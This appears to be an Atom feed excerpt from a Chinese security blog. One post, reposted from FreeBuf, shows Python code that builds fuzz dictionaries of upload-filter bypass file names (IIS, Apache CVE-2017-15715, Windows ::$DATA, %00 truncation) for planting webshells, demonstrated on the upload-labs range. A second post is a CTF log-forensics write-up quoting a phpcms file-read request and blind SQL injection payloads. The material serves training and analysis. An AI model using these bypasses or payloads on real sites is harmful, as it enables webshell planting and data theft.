    <updated>2020-04-11T03:27:48.925Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>本文转自FreeBuf</strong><br>上传漏洞的利用姿势很多，同时也会因为语言，中间件，操作系统的不同，利用也不同。比如有：大小写混合，.htaccess，解析漏洞，00截断，.绕过，空格绕过，::$DATA绕过，以及多种姿势的组合等等。当遇到一个上传点，如何全面的利用以上姿势测试一遍，并快速发现可以成功上传webshell的姿势？</p><a id="more"></a><h2 id="方案一：-一个一个手工测试"><a href="#方案一：-一个一个手工测试" class="headerlink" title="方案一： 一个一个手工测试"></a>方案一： 一个一个手工测试</h2><p>手工把所有姿势测试一遍，先不说花费大量时间，还很可能会遗漏掉某些姿势而导致无法利用成功。</p><h2 id="方案二：fuzz"><a href="#方案二：fuzz" class="headerlink" title="方案二：fuzz"></a>方案二：fuzz</h2><p>在fuzz时我们往往会给一个输入点喂入大量特殊的数据。这个特殊的数据可能随机的，毫无规律的，甚至我们都无法预知的。但我思考了一下，这样的fuzz方式只是适合在本地fuzz 0day漏洞，并不适合通过fuzz在线网站的上传点，快速找出可以成功上传webshell的payload，因为时间成本排在哪里。</p><p>通过思考，我们可以知道如果能根据上传漏洞的场景（后端语言，中间件，操作系统）来生成优质的fuzz字典，然后使用该字典进行fuzz，就能消除以上两个解决方案的弊端！</p><h2 id="一、构想"><a href="#一、构想" class="headerlink" title="一、构想"></a>一、构想</h2><p>在动手之前我们来思考下上传漏洞跟那些因素有关：</p><blockquote><p>1.可解析的后缀，也就是该语言有多个可解析的后缀，比如php语言可解析的后缀为php,php2,php3等等<br><br>2.大小写混合，如果系统过滤不严，可能大小写可以绕过。<br><br>3.中间件，每款中间件基本都解析漏洞,比如IIS就可以把xxx.asp;.jpg当asp来执行。<br><br>4.系统特性，特别是Windows的后缀加点（.）,加空格，加::$DATA可以绕过目标系统。<br><br>5.语言漏洞，流行的三种脚本语言基本都存在00截断漏洞。<br><br>6.双后缀，这个与系统和中间件无关，偶尔会存在于代码逻辑之中。<br></p></blockquote><p>整理以上思考，我们把生成字典的规则梳理为以下几条：</p><blockquote><ol><li>可解析的后缀+大小写混合</li><li>可解析的后缀+大小写混合+中间件漏洞</li><li>.htaccess + 大小写混合</li><li>可解析的后缀+大小写混合+系统特性</li><li>可解析的后缀+大小写混合+语言漏洞</li><li>可解析的后缀+大小写混合+双后缀</li></ol></blockquote><p>下面我们根据上面的构想，来分析每一方面的细节，并使用代码来实现。</p><h2 id="二、-可解析后缀"><a href="#二、-可解析后缀" class="headerlink" title="二、 可解析后缀"></a>二、 可解析后缀</h2><p>其实很多语言都这样，有多个可以解析后缀。当目标站点采用黑名单时，往往包含不全。以下我收集相对比较全面的可解析后缀，为后面生成字典做材料。</p><p><img src="/2020/04/11/%E6%9E%84%E9%80%A0%E4%BC%98%E8%B4%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EFuzz%E5%AD%97%E5%85%B8/1.png" alt></p><h2 id="三、-大小写混合"><a href="#三、-大小写混合" class="headerlink" title="三、 大小写混合"></a>三、 大小写混合</h2><p>有些网站过滤比较简单，只是过滤了脚本后缀，但是没有对后缀进行统一转换为小写，在进行判断。这就存在一个大小写问题。这里我们可以编写两个函数，一个函数是传入一个字符串，函数返回该字符串所有大小写组合的可能，第二个函数是基于第一个函数，把一个list的传入返回一个list内所有字符的所有大小写组合的可能。</p><h2 id="字符串大小写混合，返回字符串所有大写可能"><a href="#字符串大小写混合，返回字符串所有大写可能" class="headerlink" title="字符串大小写混合，返回字符串所有大写可能"></a>字符串大小写混合，返回字符串所有大写可能</h2><pre><code>def str_case_mixing(word):    str_list = []    word = word.lower()    tempWord = copy.deepcopy(word)    plist = []    redict = {}    for char in range( len( tempWord ) ):        char = word[char]        plist.append(char)     num = len( plist )    for i in range( num ):        for j in range( i , num + 1 ):            sContent = &apos;&apos;.join( plist[0:i] )            mContent = &apos;&apos;.join( plist[i:j] )            mContent = mContent.upper()            eContent = &apos;&apos;.join( plist[j:] )            content = &apos;&apos;&apos;%s%s%s&apos;&apos;&apos; % (sContent,mContent,eContent)            redict[content] = None    for i in redict.keys():        str_list.append(i)    return str_list## list大小写混合def list_case_mixing(li):    res = []    for l in li:        res += uperTest(l)    return res</code></pre><h2 id="四、-中间件漏洞"><a href="#四、-中间件漏洞" class="headerlink" title="四、 中间件漏洞"></a>四、 中间件漏洞</h2><p>这块是比较复杂的一块。首先我们先来梳理下</p><h3 id="4-1-IIS"><a href="#4-1-IIS" class="headerlink" title="4.1 IIS"></a>4.1 IIS</h3><p>IIs一共有三个解析漏洞：</p><ol><li>IIS6.0文件解析 xx.asp;.jpg2.IIS6.0目录解析 xx.asp/1.jpg3.IIS 7.0畸形解析 xxx.jpg/x.asp</li></ol><p>由于2和3和上传的文件名无关，故我们只根据1来生成fuzz字典</p><pre><code>def iis_suffix_creater(suffix):    res = []    for l in suffix:        str =&apos;%s;.%s&apos; % (l,allow_suffix)        res.append(str)    return res</code></pre><h3 id="4-2-apache"><a href="#4-2-apache" class="headerlink" title="4.2 apache"></a>4.2 apache</h3><p>apache相关的解析漏洞有两个：</p><ol><li>%0a(CVE-2017-15715)</li><li>未知后缀 test.php.xxx</li></ol><p>根据以上构造<code>apache_suffix_builder</code>函数生成规则：</p><pre><code>def apache_suffix_creater(suffix):    res = []    for l in suffix:        str = &apos;%s.xxx&apos; % l        res.append(str)        str = &apos;%s%s&apos; % (l,urllib.unquote(&apos;%0a&apos;)) #CVE-2017-15715        res.append(str)    return res</code></pre><h3 id="4-3-nginx"><a href="#4-3-nginx" class="headerlink" title="4.3 nginx"></a>4.3 nginx</h3><p>nginx解析漏洞有三个：</p><ol><li>访问连接加/xxx.php test.jpg/xxx.php</li><li>畸形解析漏洞 test.jpg%00xxx.php</li><li>CVE-2013-4547 test.jpg(非编码空格)\0x.php</li></ol><p>nginx的解析漏洞，由于和上传的文件名无关，故生成字典无需考虑。</p><h3 id="4-4-tomcat"><a href="#4-4-tomcat" class="headerlink" title="4.4 tomcat"></a>4.4 tomcat</h3><p>tomcat用于上传绕过的有三种,不过限制在windows操作系统下。</p><pre><code>xxx.jsp/xxx.jspxxx.jsp::$DATA</code></pre><p>根据以上规则生成字典对应的代码为：</p><pre><code>win_tomcat = [&apos;%20&apos;,&apos;::$DATA&apos;,&apos;/&apos;]def tomcat_suffix_creater(suffix):    res = []    for l in suffix:        for t in win_tomcat:            str = &apos;%s%s&apos; % (l,t)            res.append(str)    return res</code></pre><p>如果确定中间件为apache,可以加入.htaccess。同时如果操作系统还为windows，我们可以大小写混合。</p><pre><code>if (middleware == &apos;apache&apos; or middleware == &apos;all&apos;) and (os == &apos;win&apos; or os == &apos;all&apos;):    htaccess_suffix = uperTest(&quot;.htaccess&quot;)elif (middleware == &apos;apache&apos; or middleware == &apos;all&apos;) and os == &apos;linux&apos;:    htaccess_suffix = [&apos;.htaccess&apos;]else:    htaccess_suffix = []</code></pre><h3 id="4-5-语言，中间件与操作系统的关系"><a href="#4-5-语言，中间件与操作系统的关系" class="headerlink" title="4.5 语言，中间件与操作系统的关系"></a>4.5 语言，中间件与操作系统的关系</h3><p>以上我们根据每个中间件的漏洞，编写了对应的fuzz字典生成函数。在最终生成字典时，我们还要考虑中间件可以运行那些语言，以及它们与平台的关系。</p><p><img src="/2020/04/11/%E6%9E%84%E9%80%A0%E4%BC%98%E8%B4%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EFuzz%E5%AD%97%E5%85%B8/2.png" alt></p><p>根据上表，我们明白：</p><p>iis下可以运行asp/aspx,php,jsp脚本，故这3种脚本语言可解析后缀均应该传入iis_suffix_builder()进行处理；</p><p>apache下可以运行asp/aspx,php。故这2两种脚本语言可解析后缀均应该传入apache_suffix_builder()进行处理；</p><p>tomcat下可以运行php，jsp，故这两个脚本语言可解析后缀均应该传入tomcat_suffix_builder()进行处理。</p><p>注意：根据对tomcat上传的绕过分析，发现之后在windows平台下才能成功。故之后在Windows平台下才会调用<code>tomcat_suffix_builder()</code>对可解析后缀进行处理。</p><p>故伪代码可以编写如下：</p><pre><code>if middleware == &apos;iis&apos;:    case_asp_php_jsp_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_jsp_parse_suffix    middleware_parse_suffix = iis_suffix_creater(case_asp_php_jsp_parse_suffix)elif middleware == &apos;apache&apos;:    case_asp_php_html_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_html_parse_suffix    middleware_parse_suffix = apache_suffix_creater(case_asp_php_html_parse_suffix)elif middleware == &apos;tomcat&apos; and os == &apos;linux&apos;:    middleware_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffixelif middleware == &apos;tomcat&apos; and (os == &apos;win&apos; or os == &apos;all&apos;):    case_php_jsp_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix    middleware_parse_suffix = tomcat_suffix_creater(case_php_jsp_parse_suffix)else:    case_asp_php_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix    iis_parse_suffix = iis_suffix_creater(case_asp_php_parse_suffix)    case_asp_php_html_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_html_parse_suffix    apache_parse_suffix = apache_build(case_asp_php_html_parse_suffix)    case_php_jsp_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix    tomcat_parse_suffix = tomcat_build(case_php_jsp_parse_suffix)            middleware_parse_suffix = iis_parse_suffix + apache_parse_suffix + tomcat_parse_suffix</code></pre><h2 id="五、-系统特性"><a href="#五、-系统特性" class="headerlink" title="五、 系统特性"></a>五、 系统特性</h2><p>经过查资料，目前发现在系统层面，有以下特性可以被上传漏洞所利用。</p><p>Windows下文件名不区分大小写，Linux下文件名区分大写欧西；</p><p>Windows下ADS流特性，导致上传文件xxx.php::$DATA = xxx.php；</p><p>Windows下文件名结尾加入<code>.</code>,<code>空格</code>,<code>&lt;</code>,<code>·`</code>&gt;<code>,</code>&gt;&gt;&gt;<code>,</code>0x81-0xff`等字符，最终生成的文件均被windows忽略。</p><pre><code># 生成0x81-0xff的字符listdef str_81_to_ff():    res = []    for i in range(129,256):        str = &apos;%x&apos; % i        str = &apos;%&apos; + str        str = urllib.unquote(str)        res.append(str)    return reswindows_os = [&apos; &apos;,&apos;.&apos;,&apos;/&apos;,&apos;::$DATA&apos;,&apos;&lt;&apos;,&apos;&gt;&apos;,&apos;&gt;&gt;&gt;&apos;,&apos;%20&apos;,&apos;%00&apos;] + str_81_to_ff()def windows_suffix_builder(suffix):    res = []    for s in suffix:        for w in windows_os:            str = &apos;%s%s&apos; % (s,w)            res.append(str)    return res</code></pre><h2 id="六、-语言的漏洞"><a href="#六、-语言的漏洞" class="headerlink" title="六、 语言的漏洞"></a>六、 语言的漏洞</h2><p>语言漏洞被利用于上传的有%00截断和0x00截断。它们在asp，php和jsp中都存在着。</p><pre><code>def str_00_truncation(suffix,allow_suffix):    res = []    for i in suffix:        str = &apos;%s%s.%s&apos; % (i,&apos;%00&apos;,allow_suffix)        res.append(str)        str = &apos;%s%s.%s&apos; % (i,urllib.unquote(&apos;%00&apos;),allow_suffix)        res.append(str)    return res</code></pre><h2 id="七、-双后缀"><a href="#七、-双后缀" class="headerlink" title="七、 双后缀"></a>七、 双后缀</h2><p>有些站点通过对上传文件名进行删除敏感字符（php,asp,jsp等等）的方式进行过滤,例如你上传一个aphp.jpg的文件，那么上传之后就变成了a.jpg。这时就可以利用双后缀的方式上传一个a.pphphp,最终正好生成a.php。其实双后缀与中间件和操作系统无关，而是和代码逻辑有关。</p><p>针对双后缀，我们可以写个str_double_suffix_creater(suffix)函数，传入后缀名suffix即可生成所有的双后缀可能。</p><pre><code>def str_double_suffix_creater(suffix):    res = []    for i in range(1,len(suffix)):        str = list(suffix)        str.insert(i,suffix)        res.append(&quot;&quot;.join(str))    return res</code></pre><p>在<code>list_double_suffix_creater(suffix)</code>函数基础上，可以编写<code>list_double_suffix_creater(list_suffix)</code>来为一个list生成所有双后缀可能。</p><pre><code>def list_double_suffix_creater(list_suffix):    res = []    for l in list_suffix:        res += double_suffix_creater(l)    return duplicate_removal(res)</code></pre><h2 id="八、-整合代码"><a href="#八、-整合代码" class="headerlink" title="八、 整合代码"></a>八、 整合代码</h2><p>上面我们针对和上传漏洞相关的每个方面进行了细致的分析，也提供了相关的核心代码。最终整合后的代码限于边幅，就放在github上了。<br><a href="https://github.com/c0ny1/upload-fuzz-dic-builder" target="_blank" rel="noopener">https://github.com/c0ny1/upload-fuzz-dic-builder</a></p><pre><code>$ python upload-fuzz-dic-builder.py -husage: upload-fuzz-dic-builder [-h] [-n] [-a] [-l] [-m] [--os] [-d] [-o]optional arguments:  -h, --help            show this help message and exit  -n , --upload-filename                        Upload file name  -a , --allow-suffix   Allowable upload suffix  -l , --language       Uploaded script language  -m , --middleware     Middleware used in Web System  --os                  Target operating system type  -d, --double-suffix   Is it possible to generate double suffix?  -o , --output         Output file</code></pre><p>脚本可以之定义生成的上传文件名（-n），允许的上传的后缀（-a），后端语言（-l），中间件(-m),操作系统（—os），是否加入双后缀（-d）以及输出的字典文件名（-o）。我们可以根据场景来生成合适的字典，提供的信息越详细，脚本生成的字典越精确。</p><h2 id="九、案例"><a href="#九、案例" class="headerlink" title="九、案例"></a>九、案例</h2><p>upload-labs靶场的Pass-03到Pass-10其实都是关于后缀的，在不知道代码的情况下，我们如何快速发现可以绕过的后缀呢？这时我们就可以使用upload-fuzz-dic-builder.py脚本生成fuzz字典，来进行fuzz。这里我选择Pass-09来给大家演示。</p><h3 id="1-利用脚本生成Fuzz字典"><a href="#1-利用脚本生成Fuzz字典" class="headerlink" title="1.利用脚本生成Fuzz字典"></a>1.利用脚本生成Fuzz字典</h3><p>由于知道我们的后端语言为php,中间件为apache，操作系统为Windows。所以可以利用这些信息生成更精确的fuzz字典。</p><pre><code>$ python upload-fuzz-dic-builder.py -l php -m apache --os win[+] 收集17条可解析后缀完毕！[+] 加入145条可解析后缀大小写混合完毕！[+] 加入152条中间件漏洞完毕！[+] 加入37条.htaccess完毕！[+] 加入10336条系统特性完毕！[+] 去重后共10753条数据写入upload_fuzz_dic.txt文件</code></pre><p><img src="/2020/04/11/%E6%9E%84%E9%80%A0%E4%BC%98%E8%B4%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EFuzz%E5%AD%97%E5%85%B8/3.png" alt></p><h3 id="2-抓包使用burp的Intruder模块对上传名称进行fuzz"><a href="#2-抓包使用burp的Intruder模块对上传名称进行fuzz" class="headerlink" title="2.抓包使用burp的Intruder模块对上传名称进行fuzz"></a>2.抓包使用burp的Intruder模块对上传名称进行fuzz</h3><p>抓取upload-labs的Pass-09的上传包，发送到Intruder模块，加载第一步脚本生成的fuzz字典，对上传的包的文件名进行fuzz。</p><p><img src="/2020/04/11/%E6%9E%84%E9%80%A0%E4%BC%98%E8%B4%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EFuzz%E5%AD%97%E5%85%B8/4.png" alt><br>经过测试，通过fuzz可以快速找到可以突破upload-labs那些基于后缀的Pass的payload。甚至fuzz出同一个Pass多种绕过的方法。</p><p><a href="https://www.freebuf.com/articles/web/188464.html" target="_blank" rel="noopener" title="本文作者：gv·残亦，本文属于FreeBuf原创奖励计划，未经许可禁止转载">https://www.freebuf.com/articles/web/188464.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;本文转自FreeBuf&lt;/strong&gt;&lt;br&gt;上传漏洞的利用姿势很多，同时也会因为语言，中间件，操作系统的不同，利用也不同。比如有：大小写混合，.htaccess，解析漏洞，00截断，.绕过，空格绕过，::$DATA绕过，以及多种姿势的组合等等。当遇到一个上传点，如何全面的利用以上姿势测试一遍，并快速发现可以成功上传webshell的姿势？&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>分析web日志</title>
    <link href="http://black0saturday.github.io/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/"/>
    <id>http://black0saturday.github.io/2020/04/09/分析web日志/</id>
    <published>2020-04-09T09:35:44.000Z</published>
    <updated>2020-04-10T10:12:55.051Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前打铁人三项数据赛经常交给我来，总结了一些分析web日志的干货。<br><a id="more"></a></p><p>相关资料：<br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/0.png" alt></p><pre><code>【链接: https://pan.baidu.com/s/1o7FcHui 密码: jpdn】</code></pre><h2 id="1-工具"><a href="#1-工具" class="headerlink" title="1. 工具"></a>1. 工具</h2><p>我做日志分析经常用到的工具就是 </p><ol><li>ApacheLogsViewer</li><li>SubLime或者Notepad++</li><li>BeyondCompare</li></ol><h2 id="2-日志格式学习"><a href="#2-日志格式学习" class="headerlink" title="2. 日志格式学习"></a>2. 日志格式学习</h2><p>一条访问信息记录如下：</p><pre><code>218.19.140.242 - - [10/Dec/2010:09:31:17 +0800] &quot;GET /query/trendxml/district/todayreturn/month/2009-12-14/2010-12-09/haizhu_tianhe.xml HTTP/1.1&quot; 200 1933 &quot;-&quot; &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 (.NET CLR 3.5.30729)&quot;</code></pre><p>从这条信息可以获取到九条信息：</p><ol><li><p>218.19.140.242<br>这是一个请求到 apache 服务器的客户端 ip, 默认的情况下,第一项信息只是远程主机的 ip 地址,但我们如果需要apache 查出主机的名字,可以将 HostnameLookups 设置为 on, 但这种做法是不推荐使用,因为它大大的减缓了服务器。另外这里的 ip 地址不一定就是客户主机的 ip 地址，如果 客户端使用了代理服务器,那么这里的 ip 就是代理服务器的地址,而不是原机. </p></li><li><p>-<br>输出中的“连字符”表示请求的信息不可用。在这种情况下，不可用的信息是由客户机上的identid确定的客户机的RFC 1413标识。这种信息是高度不可靠的，几乎不应该使用，除非在严格控制的内部网络。除非IdentityCheck设置为On，否则Apache httpd甚至不会尝试确定此信息</p></li><li><p>-<br>这一项又是为空白,不过这项是用户记录用户 HTTP 的身份验证,如果某些网站要求用户进行身份验证,那么这一项就是记录用户的身份信息 </p></li><li><p>[10/Dec/2010:09:31:17 +0800] </p></li></ol><p>第四项是记录请求的时间,格式为 <code>[day/month/year:hour:minute:second zone]</code>, 最后的 <code>+0800</code> 表示服务器所处的时区为东八区</p><ol start="5"><li>“GET /query/trendxml/district/todayreturn/month/2009-12-14/2010-12-09/haizhu_tianhe.xml HTTP/1.1”</li></ol><p>这一项整个记录中最有用的信息,首先,它告诉我们的服务器收到的是一个 GET 请求,其次,是客户端请求的资源路径,第三,客户端使用的协议是 HTTP/1.1, 整个格式为 “%m %U%q %H” ,即”请求方法/访问路径/协议” </p><ol start="5"><li><p>200<br>这是一个状态码,由服务器端发送回客户端,它告诉我们客户端的请求是否成功,或者是重定向,或者是碰到了什么样的错误,这项值为 200，表示服务器已经成功的响应了客户端的请求,一般来说,这项值以 2 开头的表示请求成功,以 3 开头的表示重定向,以 4 开头的标示客户端存在某些的错误,以 5 开头的标示服务器端存在某些错误。本人博客有一篇文章专门讲了状态码</p></li><li><p>1933<br>这项表示服务器向客户端发送了多少的字节,在日志分析统计的时侯,把这些字节加起来就可以得知服务器在某点时间内总的发送数据量是多少。</p></li><li><ul><li>HTTP Referer：告诉服务器我是从哪个页面链接过来的,没有值时可能是直接打开网页的原因。</li></ul></li><li><p>“Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 (.NET CLR 3.5.30729)”</p></li></ol><p>User-Agent 这项主要记录客户端的浏览器信息</p><h2 id="3-黑客入侵日志分析"><a href="#3-黑客入侵日志分析" class="headerlink" title="3. 黑客入侵日志分析"></a>3. 黑客入侵日志分析</h2><p>客户的网站被大黑阔入侵了，你现在需要做的是:</p><blockquote><p>1、找到入侵的 IP 地址<br><br>2、入侵者如何找到网站后台的？<br><br>3、入侵者如何进入后台？<br><br>4、入侵者修改了什么文件来写一句话？<br><br>5、入侵者通过一句话后门做了什么？<br></p></blockquote><p>开始做，下载日志分析</p><ul><li><code>【access.log】</code></li><li><code>【error.log】</code></li></ul><p>先看<code>access.log</code><br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/1.png" alt></p><p>利用<strong>sublime</strong>和<strong>notepadd++</strong>都可以看，如果想看的方便一下可以用<strong>ApacheLogsViewer</strong><br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/2.png" alt></p><h3 id="1-找到入侵的-IP-地址"><a href="#1-找到入侵的-IP-地址" class="headerlink" title="(1)找到入侵的 IP 地址"></a>(1)找到入侵的 IP 地址</h3><p>因为一般来说，如果不能一下子找到后台的话，就需要用一些目录爆破工具，而爆破的过程中，因为请求了很多不存在的目录，就会出现很多 404 状态的日志。</p><p>我们可以看一下报错状态的记录，点击【status】，就能发现了有几个 IP 的请求出现了404。<br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/3.png" alt><br>再往下拉，可以发现很明显的带有 payload 的恶意请求，它们都来自 IP【219.239.105.18】，说明这个 IP 地址就是大黑阔的地址。<br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/4.png" alt></p><h3 id="2-入侵者如何找到后台的"><a href="#2-入侵者如何找到后台的" class="headerlink" title="(2)入侵者如何找到后台的"></a>(2)入侵者如何找到后台的</h3><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/5.png" alt><br>放到过滤器里，使用包括【include】的方式，然后应用该过滤【Apply Filter】<br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/6.png" alt></p><p>过滤出来的数据，点击【Date】按递增时间排序，就可以看到第一条记录是【2016/8/9 2:54:12】，即是入侵者第一次访问时间。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/7.png" alt><br>往下看，可以看到出现大量 404 的访问记录，说明是在爆目录。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/8.png" alt></p><p>到了【2016/8/9 22:17:02】之后明显没有 404 访问记录，说明已经停止了爆目录，并且可以看到入侵者开始访问后台了。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/9.png" alt></p><h3 id="3-入侵者如何进入后台"><a href="#3-入侵者如何进入后台" class="headerlink" title="(3) 入侵者如何进入后台"></a>(3) 入侵者如何进入后台</h3><p>从【2016/8/9 22:37:30】开始可以看到大量的 POST 请求，几秒之内就有多个请求，说明这是在进行爆破。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/10.png" alt></p><p>而在【2016/8/9 23:02:28】从<code>【http://192.168.0.104/phpcms/index.php?m=admin&amp;c=index&amp;a=public_current_pos&amp;menuid=10】</code>这一条开始，请求的内容都是后台界面才有的，可见入侵者成功爆破出密码并登录后台。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/11.png" alt></p><h3 id="4-入侵者动了哪个文件"><a href="#4-入侵者动了哪个文件" class="headerlink" title="(4) 入侵者动了哪个文件"></a>(4) 入侵者动了哪个文件</h3><p>我们可以看到最后这一句</p><pre><code>GET /index.php?%20%20m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../phpsso_server/caches/configs/database.php HTTP/1.1</code></pre><p>通过搜索相关资料<a href="http://blog.csdn.net/god_7z1/article/details/7816389" target="_blank" rel="noopener">http://blog.csdn.net/god_7z1/article/details/7816389</a><br>可以知道该漏洞的利用方法如下：</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/12.png" alt></p><p>这一部分即是入侵者在修改的时候发起的请求：</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/13.png" alt></p><h3 id="5-入侵者做了什么"><a href="#5-入侵者做了什么" class="headerlink" title="(5) 入侵者做了什么"></a>(5) 入侵者做了什么</h3><p>可以看到读取了数据库的帐号密码和系统的帐号密码。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/14.png" alt></p><h2 id="4-SQL注入日志分析"><a href="#4-SQL注入日志分析" class="headerlink" title="4. SQL注入日志分析"></a>4. SQL注入日志分析</h2><p>客户的网站又被入侵了，而且还是 sql 注入的形式，你现在需要做的是</p><blockquote><p>1、入侵者使用的方法属于 sql 注入中的什么方法?<br><br>2、入侵者从什么时候开始用脚本跑数据的？<br><br>3、入侵者的 payload 格式是怎样的，解译一下。<br><br>4、入侵者拿到了什么数据？数据内容是什么？<br></p></blockquote><p>下载日志文件之后，发现是都是类似的请求<br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/15.png" alt></p><h3 id="1-入侵者使用的是sql注入中的哪种注入"><a href="#1-入侵者使用的是sql注入中的哪种注入" class="headerlink" title="(1) 入侵者使用的是sql注入中的哪种注入"></a>(1) 入侵者使用的是sql注入中的哪种注入</h3><pre><code>GET /?id=1%27%20and%20ascii(substr((select%20database()),1,1))%3E104%23 HTTP/1.1</code></pre><p>很明显是通过盲注的形式跑数据的。使用盲注的脚本可以参考：</p><p><a href="https://github.com/yuesecurity/sqli-exploit/blob/master/sqliblind/sqlibaseblind.py" target="_blank" rel="noopener">https://github.com/yuesecurity/sqli-exploit/blob/master/sqliblind/sqlibaseblind.py</a></p><h3 id="2-入侵者用脚本跑数据的时间"><a href="#2-入侵者用脚本跑数据的时间" class="headerlink" title="(2) 入侵者用脚本跑数据的时间"></a>(2) 入侵者用脚本跑数据的时间</h3><p>从【2017/9/2 12:20:42】开始短时间内发起大量请求。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/16.png" alt></p><h3 id="3-入侵者的payload是什么"><a href="#3-入侵者的payload是什么" class="headerlink" title="(3) 入侵者的payload是什么"></a>(3) 入侵者的payload是什么</h3><pre><code>/?id=1%27%20and%20ascii(substr((select%20database()),1,1))=114%23】</code></pre><p>其中读取 database()，然后 substr 选择。<br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/17.png" alt><br>选择出来的数据用 ascii 编码，与后面的数字 114 比较。</p><h3 id="4-入侵者得到了什么"><a href="#4-入侵者得到了什么" class="headerlink" title="(4) 入侵者得到了什么"></a>(4) 入侵者得到了什么</h3><p>拿到 database() 和 user()。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/18.png" alt><br>仔细观察，可以发现是后面的 1 去比较这个 database() 的 1 到 15 位。然后再用 2 去比较 1 到 15 位。</p><p>而判断是否匹配的方法是看返回的包的大小：</p><p>【654】包的数量比【665】的多很多，【665】的包是盲注匹配成功时候返回的包。<br><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/19.png" alt><br>于是把【665】的包里的数值一个个写到表格里，用 <a href="http://evilcos.me/lab/xssor/" target="_blank" rel="noopener">http://evilcos.me/lab/xssor/</a> 转成对应的字符。当然我比较懒，这里没有填完。</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/20.png" alt></p><p>还是用脚本跑一下比较爽：</p><p><img src="/2020/04/09/%E5%88%86%E6%9E%90web%E6%97%A5%E5%BF%97/21.png" alt></p><p>可以看到 database 是【security】，user 是【flag0isfjisas8hh@loc】。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;之前打铁人三项数据赛经常交给我来，总结了一些分析web日志的干货。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="http://black0saturday.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式小贴士</title>
    <link href="http://black0saturday.github.io/2020/04/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%B0%8F%E8%B4%B4%E5%A3%AB/"/>
    <id>http://black0saturday.github.io/2020/04/07/正则表达式小贴士/</id>
    <published>2020-04-07T06:06:18.000Z</published>
    <updated>2020-04-07T07:44:09.327Z</updated>
    
